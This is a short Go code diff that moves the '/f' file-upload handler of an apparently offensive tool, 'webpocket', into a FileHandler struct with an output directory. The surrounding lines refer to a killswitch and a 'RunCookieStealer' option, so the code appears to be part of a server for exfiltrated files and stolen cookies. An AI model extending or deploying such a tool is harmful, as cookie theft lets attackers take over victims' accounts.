@@ -24,7 +24,9 @@ func main() {
 		log.Printf("%s Killswitch activated\n", webpocket.LogInfo)
 	}
 
-	http.HandleFunc("/f", webpocket.UploadHandler)
+	fh := &webpocket.FileHandler{}
+	fh.OutDir = webpocket.OutDir
+	http.HandleFunc("/f", fh.UploadHandler)
 
 	if webpocket.RunCookieStealer {
 		if !webpocket.Quite {
